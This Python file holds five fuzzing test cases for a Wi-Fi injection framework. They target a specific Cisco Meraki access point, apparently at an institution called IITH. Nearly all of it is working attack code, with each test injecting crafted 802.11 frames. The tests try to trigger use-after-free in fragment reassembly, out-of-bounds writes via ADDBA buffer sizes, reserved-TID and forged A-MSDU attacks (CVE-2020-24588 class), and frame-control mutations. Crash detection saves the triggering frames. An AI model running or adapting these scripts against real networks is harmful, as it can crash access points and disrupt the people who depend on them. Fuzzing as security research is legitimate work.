"""
Post-authentication fuzzing against IITH Cisco Meraki AP.

All tests run as Supplicant (client connects to IITH AP).
Requires WPA2-Enterprise EAP credentials: --config ~/iith/iith_wpa.conf

Run:
  sudo python3 run.py wlan0 iith-data-subtype  --config ~/iith/iith_wpa.conf
  sudo python3 run.py wlan0 iith-frag-orphan   --config ~/iith/iith_wpa.conf
  sudo python3 run.py wlan0 iith-addba-fuzz    --config ~/iith/iith_wpa.conf
  sudo python3 run.py wlan0 iith-qos-tid-fuzz  --config ~/iith/iith_wpa.conf
  sudo python3 run.py wlan0 iith-fcfield-fuzz  --config ~/iith/iith_wpa.conf

Target: e4:55:a8:06:7a:xx  (Cisco Meraki, ch1, WPA2-Enterprise)
Attack surface: mac80211 data frame dispatch, reassembly buffer, ADDBA reorder_buf,
                TID array OOB, A-MSDU inner frame parsing.
"""
import struct, time
from scapy.layers.dot11 import Dot11, Dot11QoS, Dot11Elt
from scapy.all import raw

from dependencies.libwifi.wifi import *
from library.testcase import Trigger, Action, Test


# ── Shared helpers ─────────────────────────────────────────────────────────────

def _qos(station, subtype=8, fc=1, tid=0, seq=None, dur=0):
    """Build QoS Data frame header directed at the AP."""
    if seq is None:
        station.sn += 1
        seq = station.sn
    p = Dot11(type=2, subtype=subtype, FCfield=fc,
              addr1=station.bss, addr2=station.mac, addr3=station.bss,
              SC=(seq & 4095) << 4, ID=dur & 65535)
    p /= Dot11QoS(TID=tid & 15)
    return p


def _inj_enc(station, frame, body=b'\x00' * 16):
    """Encrypt and inject via monitor interface."""
    frame = frame / body
    if station.tk:
        frame = station.encrypt(frame, station.tk)
    station.inject_mon(frame)
    time.sleep(0.04)


def _action(station, cat, act, body=b''):
    """Build Action frame STA→AP."""
    p = Dot11(type=0, subtype=13, FCfield=0,
              addr1=station.bss, addr2=station.mac, addr3=station.bss)
    p /= bytes([cat, act]) + body
    return p


_inj_count = 0
_last_label = '(none)'

def _inj_enc_check(station, frame, body=b'\x00' * 16, label='', check_every=10):
    """
    Inject frame + check AP liveness every N injections.

    Liveness = wpa_state=COMPLETED in STATUS response.
    Disconnect = AP processed something it didn't like or crashed.
    """
    global _inj_count, _last_label
    _inj_count += 1
    _last_label = label or _last_label

    frame = frame / body
    if station.tk:
        frame = station.encrypt(frame, station.tk)
    station.inject_mon(frame)
    time.sleep(0.04)

    if _inj_count % check_every == 0:
        try:
            status = station.wpaspy_command('STATUS')
            alive = 'wpa_state=COMPLETED' in status
        except Exception:
            alive = False

        if not alive:
            log(STATUS,
                f'[EFFECT DETECTED] AP disconnected after label={_last_label} '
                f'inject_count={_inj_count}', color='red')
            # Save last frame as crash candidate
            import os
            ts = int(time.time())
            path = f'/tmp/iith_crash_{ts}_{label[:40].replace(" ","_")}.bin'
            try:
                with open(path, 'wb') as f:
                    f.write(bytes(frame))
                log(STATUS, f'[CRASH FRAME] Saved: {path}', color='red')
            except Exception:
                pass
        else:
            log(STATUS, f'  [alive] after {_inj_count} frames', color='cyan')


# ── Test 1: Data subtype sweep ─────────────────────────────────────────────────

class IithDataSubtype(Test):
    """
    Inject all 16 data subtypes (0–15) + reserved 0x2d post-auth.

    mac80211 dispatches on subtype bits. Reserved subtypes (null-data variants,
    CF-Poll, CF-Ack combos) have sparse handling — missing cases may null-deref
    or execute stale function pointers in older kernels.

    Owfuzz pcap (iith_poc.pcap) saw subtype 0x2d (0b101101) returned in probe
    responses — indicates AP processes unexpected subtypes.
    """
    name = 'iith-data-subtype'
    kind = Test.Supplicant

    def __init__(self):
        super().__init__([
            Action(trigger=Trigger.Connected, action=Action.Function),
            Action(trigger=Trigger.Disconnected, action=Action.Terminate),
        ])

    def run_subtypes(self, station):
        log(STATUS, '[iith-data-subtype] Connected. Running subtype sweep.', color='green')
        body = b'\xde\xad\xbe\xef' * 4

        for subtype in range(16):
            frame = _qos(station, subtype=subtype, fc=1, tid=0)
            label = f'subtype-{subtype:#04x}'
            _inj_enc_check(station, frame, body, label=label, check_every=8)
            log(STATUS, f'  {label}')

        # Reserved subtype 0x0d (seen in owfuzz pcap)
        for _ in range(5):
            frame = _qos(station, subtype=0x0d, fc=1, tid=0)
            _inj_enc_check(station, frame, body, label='subtype-0x0d-repeat', check_every=5)

        log(STATUS, '[iith-data-subtype] Done. 21 frames injected.', color='green')

    def generate(self, station):
        self.actions[0].set_function(self.run_subtypes)
        self.actions[0].set_terminate(delay=2)


# ── Test 2: Fragment cache orphan flood ───────────────────────────────────────

class IithFragOrphan(Test):
    """
    Inject 384 orphaned high-FN fragments to exhaust reassembly buffer.

    mac80211 maintains per-STA fragment cache (ieee80211_fragment_cache).
    An orphaned fragment (FN > 0 without corresponding FN=0) is held in
    cache until eviction timer fires. Filling cache → eviction of old entries
    → potential UAF if evicted entry still referenced.

    Attack pattern:
      For 384 unique seqnums: inject FN=1 (no FN=0 → orphan)
      Then wait 3s (mac80211 reassembly timeout ~2s)
      Then try to trigger use-after-free with follow-up frames.
    """
    name = 'iith-frag-orphan'
    kind = Test.Supplicant

    def __init__(self):
        super().__init__([
            Action(trigger=Trigger.Connected, action=Action.Function),
            Action(trigger=Trigger.Disconnected, action=Action.Terminate),
        ])

    def run_orphan_flood(self, station):
        log(STATUS, '[iith-frag-orphan] Connected. Starting orphan flood.', color='green')
        body = b'\xcc' * 32

        # Phase 1: 384 orphaned FN=1,3,7,15 frags across 96 seqnums
        seqbase = station.sn + 1
        for i in range(96):
            seq = (seqbase + i) & 4095
            for fn in (1, 3, 7, 15):
                fc = 1 | 4  # to_DS + MoreFrags
                p = Dot11(type=2, subtype=8, FCfield=fc,
                          addr1=station.bss, addr2=station.mac, addr3=station.bss,
                          SC=(seq << 4) | fn)
                p /= Dot11QoS(TID=0) / body
                if station.tk:
                    p = station.encrypt(p, station.tk)
                station.inject_mon(p)
                time.sleep(0.01)
        station.sn = (seqbase + 96) & 4095

        log(STATUS, '[iith-frag-orphan] 384 orphans injected. Waiting 3s for eviction...', color='orange')
        time.sleep(3)

        # Phase 2: UAF trigger attempt — send FN=0 for same seqnums
        log(STATUS, '[iith-frag-orphan] Injecting FN=0 trigger frames.', color='orange')
        for i in range(16):
            seq = (seqbase + i) & 4095
            frame = _qos(station, subtype=8, fc=1, tid=0, seq=seq)
            _inj_enc(station, frame, b'\xaa' * 32)

        log(STATUS, '[iith-frag-orphan] Done.', color='green')

    def generate(self, station):
        self.actions[0].set_function(self.run_orphan_flood)
        self.actions[0].set_terminate(delay=2)


# ── Test 3: ADDBA reorder buffer OOB ─────────────────────────────────────────

class IithAddbafuzz(Test):
    """
    Fuzz Block Ack ADDBA request buf_size field.

    mac80211 allocates tid_ampdu_rx->reorder_buf[buf_size] in
    ieee80211_process_addba_request(). Spec max=64. If buf_size=255
    or 1023, allocation may be wrong size → OOB write when frames
    arrive at seqnum = start + buf_size.

    Pattern:
      1. Send ADDBA Request with boundary buf_size
      2. Send data frames at seqnum = start_seq + buf_size (OOB write trigger)
      3. Send DELBA to race with active BA session
    """
    name = 'iith-addba-fuzz'
    kind = Test.Supplicant

    def __init__(self):
        super().__init__([
            Action(trigger=Trigger.Connected, action=Action.Function),
            Action(trigger=Trigger.Disconnected, action=Action.Terminate),
        ])

    def run_addba(self, station):
        log(STATUS, '[iith-addba-fuzz] Connected. Starting ADDBA fuzz.', color='green')

        def addba_req(buf_size, tid=0, start_seq=0, token=1):
            ba_params = 1 | ((tid & 15) << 2) | ((buf_size & 1023) << 6)
            body = struct.pack('<BHHH', token, ba_params, 0, (start_seq & 4095) << 4)
            return _action(station, 3, 0, body)  # Cat=3 BA, Act=0 ADDBA Req

        def delba(tid=0, reason=39):
            params = 1 | ((tid & 15) << 12)  # initiator=STA
            body = struct.pack('<BHH', 0, params, reason)
            return _action(station, 3, 2, body)  # Act=2 DELBA

        body = b'\xba\xad' * 16

        for buf_size, label in [
            (0,    'bufsz-0'),
            (1,    'bufsz-1'),
            (64,   'bufsz-64-spec-max'),
            (65,   'bufsz-65-off-by-one'),
            (255,  'bufsz-255'),
            (1023, 'bufsz-1023'),
        ]:
            log(STATUS, f'  addba buf_size={buf_size} ({label})')
            start_seq = station.sn & 4095

            # 1. Send ADDBA
            frame = addba_req(buf_size, tid=0, start_seq=start_seq)
            station.inject_mon(frame)
            time.sleep(0.2)

            # 2. OOB write probe: frame at seqnum = start + buf_size
            for offset in range(min(4, max(1, buf_size))):
                oob_seq = (start_seq + buf_size + offset) & 4095
                data = _qos(station, tid=0, seq=oob_seq)
                _inj_enc(station, data, body)

            time.sleep(0.1)

            # 3. DELBA race
            station.inject_mon(delba(tid=0))
            time.sleep(0.1)
            station.sn = (station.sn + 10) & 4095

        # Unknown BA action codes
        for act in (3, 10, 50, 255):
            station.inject_mon(_action(station, 3, act, b'\x00' * 4))
            time.sleep(0.05)

        log(STATUS, '[iith-addba-fuzz] Done.', color='green')

    def generate(self, station):
        self.actions[0].set_function(self.run_addba)
        self.actions[0].set_terminate(delay=2)


# ── Test 4: QoS TID OOB + A-MSDU ──────────────────────────────────────────────

class IithQosTidFuzz(Test):
    """
    Fuzz QoS TID field (reserved values 8–15) and A-MSDU inner SA.

    mac80211 indexes tid_rx[TID] using 4-bit TID field. Valid TIDs
    are 0–7 (802.11e); TIDs 8–15 are "reserved" but mac80211 may
    still dereference them, causing OOB array access.

    A-MSDU forged inner SA: QoS A-MSDU bit set + forged inner ethernet
    src MAC. CVE-2020-24588 class — bypasses MAC address filtering.
    """
    name = 'iith-qos-tid-fuzz'
    kind = Test.Supplicant

    def __init__(self):
        super().__init__([
            Action(trigger=Trigger.Connected, action=Action.Function),
            Action(trigger=Trigger.Disconnected, action=Action.Terminate),
        ])

    def run_tid_fuzz(self, station):
        log(STATUS, '[iith-qos-tid-fuzz] Connected. Running TID sweep.', color='green')
        body = b'\x00' * 16

        # TID 0-15 sweep (8-15 are reserved/OOB)
        for tid in range(16):
            frame = _qos(station, tid=tid, fc=1)
            _inj_enc(station, frame, body)
            log(STATUS, f'  TID={tid}' + (' (reserved)' if tid >= 8 else ''))
            time.sleep(0.03)

        # A-MSDU with forged inner ethernet SA (CVE-2020-24588 class)
        inner_dst = b'\xff\xff\xff\xff\xff\xff'
        inner_src = bytes.fromhex(station.bss.replace(':', ''))  # forge AP MAC
        inner_len = struct.pack('>H', 0xDEAD)
        inner_payload = b'\xde\xad\xbe\xef' * 4
        msdu = inner_dst + inner_src + inner_len + inner_payload

        log(STATUS, '[iith-qos-tid-fuzz] Injecting A-MSDU with forged inner SA.')
        for tid in (0, 6, 7):
            # QoS ctrl byte 0x80 = A-MSDU present
            p = Dot11(type=2, subtype=8, FCfield=1,
                      addr1=station.bss, addr2=station.mac, addr3=station.bss,
                      SC=(station.sn << 4) & 0xFFF0)
            p /= bytes([0x80])  # QoS control byte: TID=0, A-MSDU=1
            p /= msdu
            if station.tk:
                p = station.encrypt(p, station.tk)
            station.inject_mon(p)
            station.sn = (station.sn + 1) & 4095
            time.sleep(0.04)

        # Garbage A-MSDU body
        p = _qos(station, fc=1, tid=0)
        _inj_enc(station, p, b'\xaa\xbb\xcc' * 50)

        log(STATUS, '[iith-qos-tid-fuzz] Done.', color='green')

    def generate(self, station):
        self.actions[0].set_function(self.run_tid_fuzz)
        self.actions[0].set_terminate(delay=2)


# ── Test 5: FCfield bit mutations ─────────────────────────────────────────────

class IithFcfieldFuzz(Test):
    """
    Fuzz FCfield bits in data frames post-auth.

    FCfield drives multiple mac80211 processing paths:
      bit0 (ToDS) + bit1 (FromDS) together = WDS 4-addr — different addr3/addr4 parsing
      bit4 (PwrMgmt)  — client claims power save → AP buffers frames → AID-indexed PS queue
      bit5 (MoreData)  — AP may send extra buffered frames
      bit6 (Protected) + cleartext body — triggers decryption of garbage → may oops
      bit7 (Order)     — HT Control field expected → parser reads extra 4 bytes past header

    Also injects plaintext (non-encrypted) data frames after auth to test
    mac80211 protected frame enforcement path.
    """
    name = 'iith-fcfield-fuzz'
    kind = Test.Supplicant

    def __init__(self):
        super().__init__([
            Action(trigger=Trigger.Connected, action=Action.Function),
            Action(trigger=Trigger.Disconnected, action=Action.Terminate),
        ])

    def run_fcfield(self, station):
        log(STATUS, '[iith-fcfield-fuzz] Connected. Running FCfield mutations.', color='green')
        body = b'\xde\xad\xbe\xef' * 8

        cases = [
            (0x01, True,  'tods-normal'),
            (0x03, True,  'wds-tods-fromds'),         # WDS 4-addr mode
            (0x05, True,  'tods-morefrag-dangling'),   # MoreFrag on last frag
            (0x09, True,  'tods-retry'),
            (0x11, True,  'tods-pwrmgmt'),             # Claim PS mode
            (0x31, True,  'tods-pm-moredata'),
            (0x41, False, 'protected-bit-cleartext'),   # Protected=1 but no CCMP
            (0x01, False, 'no-protected-bit-plain'),    # plaintext injection
            (0x81, True,  'order-bit-htc'),             # Order bit → HTC field expected
            (0xFF, True,  'all-bits-set'),
            (0xFE, True,  'all-except-tods'),
            (0x00, False, 'no-flags-plain'),
        ]

        for fc, encrypt, label in cases:
            p = Dot11(type=2, subtype=8, FCfield=fc,
                      addr1=station.bss, addr2=station.mac, addr3=station.bss,
                      SC=(station.sn << 4) & 0xFFF0)
            p /= Dot11QoS(TID=0) / body
            station.sn = (station.sn + 1) & 4095
            if encrypt and station.tk:
                p = station.encrypt(p, station.tk)
            station.inject_mon(p)
            log(STATUS, f'  fc={fc:#04x} encrypt={encrypt} ({label})')
            time.sleep(0.04)

        # WDS 4-address frame (ToDS + FromDS, extra addr4 field)
        log(STATUS, '[iith-fcfield-fuzz] Injecting WDS 4-addr frame.')
        p = Dot11(type=2, subtype=8, FCfield=0x03,
                  addr1=station.bss, addr2=station.mac,
                  addr3=station.bss,
                  SC=(station.sn << 4) & 0xFFF0)
        p /= Dot11QoS(TID=0) / (b'\xaa' * 6) / body  # fake addr4 in payload
        station.sn = (station.sn + 1) & 4095
        station.inject_mon(p)
        time.sleep(0.04)

        # Duration field boundary sweep (affects NAV timer)
        for dur in (0, 1, 0x7FFF, 0x8000, 0xFFFF):
            p = _qos(station, dur=dur)
            _inj_enc(station, p, body)

        log(STATUS, '[iith-fcfield-fuzz] Done.', color='green')

    def generate(self, station):
        self.actions[0].set_function(self.run_fcfield)
        self.actions[0].set_terminate(delay=2)
